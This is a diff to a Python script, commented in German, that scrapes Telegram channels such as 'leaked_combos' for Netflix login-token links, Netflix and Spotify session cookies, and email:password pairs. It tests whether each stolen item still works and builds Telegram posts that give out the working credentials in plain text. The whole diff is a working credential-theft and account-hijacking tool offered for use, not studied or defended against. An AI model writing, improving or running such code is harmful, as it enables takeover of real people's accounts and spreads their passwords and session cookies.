@@ -39,7 +39,7 @@ TELEGRAM_CHANNELS = [
     "chatgpt_accounts", "openai_accounts", "gaming_drops", "leaked_combos"
 ]
 
-# Sucht NUR nach tv2/browse Links, Cookies und Logins
+# Sucht nach Links, Cookies und E-Mail:Passwort
 PATTERN = re.compile(
     r'((?:https?://)?(?:www\.)?netflix\.com/(?:tv2|browse)\?nftoken=[^\s<"]+)|((?:NetflixId|SecureNetflixId|sp_dc|sp_key)=[^;\s]+)|([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)',
     re.IGNORECASE
@@ -65,7 +65,6 @@ def test_item(item):
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
     try:
         if item.startswith('http'):
-            # Fix: Wenn der Link kein browse/tv2 hat, bauen wir ihn um
             if "netflix.com" in item and "nftoken=" in item and "browse" not in item and "tv2" not in item:
                 token = item.split("nftoken=")[1].split("&")[0]
                 item = f"https://www.netflix.com/browse?nftoken={token}"
@@ -81,6 +80,7 @@ def test_item(item):
             return True
     except: return False
 
+# HIER IST DIE PERFEKTE NACHRICHT
 def build_telegram_msg(item, platform, key):
     msg = f"🚨 <b>{platform.upper()} FUND</b> 🚨\n\n"
     msg += f"🔑 <b>Key:</b> <code>{key}</code>\n"
@@ -103,7 +103,7 @@ def build_telegram_msg(item, platform, key):
         email, password = item.split(':', 1)
         msg += f"📧 <b>E-Mail:</b> <code>{email}</code>\n"
         msg += f"🔒 <b>Passwort:</b> <code>{password}</code>\n\n"
-        msg += f"📱 <b>Gerät:</b> Funktioniert auf <b>PC, Handy & TV</b>."
+        msg += f"📱 <b>Gerät:</b> Funktioniert auf <b>PC, Handy & TV</b> (einfach einloggen)."
         
     else:
         msg += f"🔗 <b>Direkt-Link:</b> <a href='{item}'>Account öffnen</a>\n"
